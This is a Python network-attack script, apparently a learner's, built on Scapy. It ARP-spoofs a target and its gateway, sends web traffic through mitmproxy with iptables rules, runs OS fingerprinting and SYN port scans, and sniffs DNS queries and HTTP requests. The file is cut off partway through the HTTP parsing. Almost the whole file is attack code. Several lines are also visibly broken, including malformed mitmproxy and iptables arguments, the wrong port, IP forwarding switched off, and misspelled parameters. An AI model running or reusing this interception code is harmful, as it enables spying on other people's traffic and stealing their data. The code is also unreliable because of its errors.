from scapy.all import ARP, Ether, sendp, sniff, conf, srp, IP, TCP, sr1, DNS, DNSQR

import time
import sys
import threading
import os
import subprocess
import datetime
import requests

conf.verb = 0

interface = "wlo1"

gateway_ip = "10.0.0.1"
target_ip = "1"
attacker_mac = "myMAc"
mitmproxy_port = 8080

def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        timestamp = datetime.datetime.now()
        f.write(f"[{timestamp}] {message}\n")

# ARP Spoofing function

def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src = attacker_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src = spoof_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    packet = ether / arp
    sendp(packet, count=4, iface=interface)
    msg = f"Spoofing {target_ip} -> {spoof_ip}"
    print(msg)
    log_to_file(msg)

def get_mac(ip):
    arp_request = Ether(dst= 'ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    result = srp (arp_request, timeout=2, iface=interface)[0]
    return result[0][1].hwsrc if result else None
# Continue spoofing
def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Spoofing error: {e}"
        print()
        log_to_file(msg)

def start_mitmproxy():
    msg = f"mitmproxy: {mitmproxy_port}: is running"
    print(msg)
    log_to_file(msg)
    mitmproxy_port = subprocess.Popen(
        ["mitmproxy", "..mode", "transparent", "...listen port", str.mitmproxy_port],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(2)
    return mitmproxy_port

#Trafikni mitmproxy'ga yo'naltirish uchun iptables sozlash
def setup_iptables():
    msg = "iptables sozlanmoqda..."
    print(msg)
    log_to_file(msg)
    os.system(f"iptables -t nat -A PREROUTING -1 {interface} -p tcp --dport 80 -j REDIRECT --to-ports{mitmproxy_port}")
    os.system(f"iptables -t nat -A PREROUTING -1 {interface} -p tcp --dport 442 -j REDIRECT --to-ports{mitmproxy_port}")
    os.system("sysctl -w net.ipv4.ip_forward=0")
def os_fingerprint(target_ip):
        msg = f"OS fingerprinting starting: {target_ip}"
        print(msg)
        log_to_file(msg)
        packet = IP(dst = target_ip)/TCP(dport = 80, flags="S")
        response = sr1(packet, timout = 2, verbose = 0)
        if response:
            ttl = response[IP].ttl
            window_size = response[TCP].window
            if ttl <= 64:
                os_guess = "Linux/Unix or Android"
            elif ttl <= 128:
                os_guess = "Windows"
            elif ttl <= 255:
                os_guess = "iOS/MacOS or Other"
            else:
                os_guess = "Unknown"
            msg = f"Guessed OS: {os_guess} (TTL: {ttl}, Window Size: {window_size})"
        else:
            msg = "Response can't get, OS is searching"
        print(msg)
        log_to_file(msg)

def scan_ports(target_ip, port_range=(1, 1000)):
    msg = f"Scanning ports: {target_ip}"
    print(msg)
    log_to_file(msg)
    open_ports = []
    for port in range(port_range[0], port_range[1]+1):
        pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout = 1, verbose=0)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12: # SYN-ACK
            open_ports.append(port)
            sr1(IP(dst=target_ip)/TCP(dport=port, flags= "R"), timeout=1, verbose=0)
    msg = f"open ports: {open_ports}"
    print(msg)
    log_to_file(msg)

def sniff_dns():
    msg = "Catching DNS requests..."
    print(msg)
    log_to_file(msg)
    def process_dns(packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            dns_query = packet[DNSQR].qname.decode("utf-8", errors="ignore")
            msg = f"DNS so`rov: {dns_query}"
            print(msg)
            log_to_file(msg)
    sniff(iface=interface, filter=f"udp port 53 and host {target_ip}", prn=process_dns, store=0)

def get_vendor(mac):
    url = f"https://api.macvendors.com/{mac}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown vendor"
    except:
        return "Internet Connection error"
    
def sniff_traffic():
    msg = "Catching Traffic..."

    print(msg)
    log_to_file(msg)

    def process_packet(packet):
        summary = packet.summary()
        print(summary)
        log_to_file(summary)
        if packet.haslayer("IP"):
            src_ip = packet["IP"].src
            dst_ip = packet["IP"].dst
            if packet.haslayer("TCP"):
                src_port = packet["TCP"].sport
                dst_port = packet["TCP"].dport
                msg = f"Ports: {src_ip}:{src_port} -> {dst_ip}:{dst_port}"
                print(msg)
                log_to_file(msg)
            if packet.haslayer("Raw"):
                payload = packet[Raw].load
                try:
                    decoded = payload.decode("utf-8", errors = "ignore")
                    if "HTTP" in decoded:
                        lines = decoded.split("\r\n")
                        url = None
                        headers = {}
                        for line in lines:
                            if line.startswith("GET") or line.startswith("POST"):
                                parts = line.split(" ")
                                if len(parts) > 1:
                                    url = parts[1] # opening URL
                            elif ": " in line:
                                key, value = line.split(": ", 1)
                                
                            


